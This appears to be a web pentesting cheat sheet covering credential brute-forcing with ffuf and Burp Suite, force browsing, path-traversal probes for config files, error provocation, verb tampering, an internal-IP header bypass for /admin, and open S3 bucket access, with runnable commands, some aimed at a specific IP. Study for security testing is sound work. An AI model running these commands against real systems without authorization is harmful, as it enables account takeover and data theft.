# Default Credentials
- Use Password-spray instead of Brute-force attack.
- Username/Password lists:
  - https://github.com/danielmiessler/SecLists/
  - https://wordlists.assetnote.io
- Brute-force with **ffuf**:
  ```bash
  ffuf -u "http://77.238.121.150:47000/login.php" -w usernames.txt:USER -w passwords.txt:PASS -d "Username=USER&Password=PASS&Submit=Login" -H "Content-Type: application/x-www-form-urlencoded" -H "Cookie:PHPSESSID=gp4vd1paqk3fr10m9o1rm3on6n" -mode pitchfork -mc all -fc 200
  ffuf -u http://site.com/api/v1/auth -w wordlist:UU,wordlist:PP -H "Content-Type: application/json" -d '{"user": "UU", "pass": "PP"}'   # fuzzing for valid credentials
  ```
- Brute-force with **Burpsuite**:
  - First select Username with $ and then select Password, then select username list for 1 and passwordlist for 2.
  - Attack type should be set to *Pitchfork*.
    - *Pitchfork*  →  `user1:pass1`, `user2:pass2`, `user3:pass3`
    - *ClusterBomb*  →  `user1:pass1`, `user1:pass2`, `user1:pass3`

# Force Browsing
- Common file types to discover:
  ```bash
  Version control files: .git|.svn
  Backup files: .zip|.tar.gz|.7z
  Bash files: .bash|.sh
  Source codes: .go|.phps|.py
  Packages files: composer.json|npm_modules
- **Endpoint** vs **Static-resource**
  - Add `a` to each part of URI, if there is a difference in response, that part is an endpoint:
    - *GET /**a**static/get/Montery.ttf HTTP/1.1*  →  `404 Not Found`
    - *GET /static/**a**get/Montery.ttf HTTP/1.1*  →  `404 Not Found`
    - *GET /static/get/**a**Montery.ttf HTTP/1.1*  →  `200 OK`
- Check if there is directory listing by adding `.` to the end of URI:
  ```bash
  GET /static/get/. HTTP/1.1
  GET /static/get/..%2findex.js HTTP/1.1
  GET /static/get/..%2nginx%2fnginx.conf HTTP/1.1
  ```
- **ffuf**
  - https://github.com/ffuf/ffuf
  - https://notes.benheater.com/books/web/page/use-ffuf-to-brute-force-login
  - Used for *Directory brute force*, *File brute force (various extensions)*, *Header fuzzing*, *Authentication brute force*.
  - Not recommended for *Parameter fuzzing* (Use **X8** instead).
  - This tool uses `User-Agent= ffuf`, so we should define it in the command.
  ```bash
  ffuf -w wordlist -u https://site.com/FUZZ                               # fuzzing for directory or file
  ffuf -w wordlist -u https://site.com/FUZZ -e .zip                       # fuzzing for .zip files
  ffuf -w wordlist -u https://site.com/FUZZ -H "Cookie: some_cookie"      # fuzzing + header
  ffuf -w wordlist -u https://site.com/FUZZ -fc 403                       # fuzzing + filtering out 403 from the result
  ffuf -w wordlist -u https://site.com/ -H "header: FUZZ"                 # fuzzing on a header
  ffuf -w wordlist -u http://site.com/FUZZ -mc all -fc 404,301,403        # fuzzing for directory or file + matching for specific status codes
  ffuf -w words.txt:YASHAR -u http://site.com/YASHAR.sql -mc all -fc 404  # finc sql files on server
  ```
  - First use `-mc all` to show all response, then find needed filters and use them by `-fc 404`.
  ```bash
  ffuf -w wordlist -u http://77.238.121.150:53001/FUZZ -mc all                 # Always use mc all
  ffuf -w wordlist -u http://77.238.121.150:53001/FUZZ -mc all -fs 10697       # We get 404 for log
  ```
- Create wordlist for fuzzing for bypasses:
  ```bash
  crunch 2 2 a1234567890 > fuzz
  ```

# Stack Trace Errors
- Verb Tamper to cause error.
- Replace numeric values with alphabetical values to cause an error.
  - `GET /product?productId=1`  =>  `GET /product?productId="example"`
- Send all characters and their combinations (*like `[]`, `()`, `{}`, `@`, `#`, ...*) in every position of parameters (*like `$$Username$$=admin&$$Password$$=admin&Submit=Login`*) to cause error.

# Verb Tamper
- Right-click on the request in  Burpsuit Repeater and select `Change request method`.
- In Burp Intruder, attack on the `Verb` with `POST`, `DELETE`, `OPTION`, `PUT`, `PATCH`, `TRACE`, `HEAD` to cause error.
- Change verb of `GET /admin HTTP/2` to `TRACE /admin HTTP/2` to reveal custom header  =>  `X-Custom-IP-Authorization: 161.97.138.12`
  - We may access to `/admin` via internal address, so we add `X-Custom-IP-Authorization: 127.0.0.1` header and send `GET /admin HTTP/2` request.
- If there is an XSS on both GET and POST of a page, we prefer to report XSS on GET request.
- GET requests are easier to chain the attack with another vulnerabilities.

# Tip
- Search for comments in Burpsuite:
  - Target  →  Site map  →  right-click on target  →  Engagement tools  →  Find comments
- Find sensitive files path (*like backups*) in `/robots.txt`.
- For websites that are hosted on **S3 bucket**, their Bucket-list must be private, otherwise we can find bucket name and change the url to access sensitive data.
  ```
  http://aws.icollab.info.s3-website.ap-northeast-2.amazonaws.com/
  http://aws.icollab.info.s3.ap-northeast-2.amazonaws.com
  http://aws.icollab.info.s3.ap-northeast-2.amazonaws.com/secr3t.txt
  ```
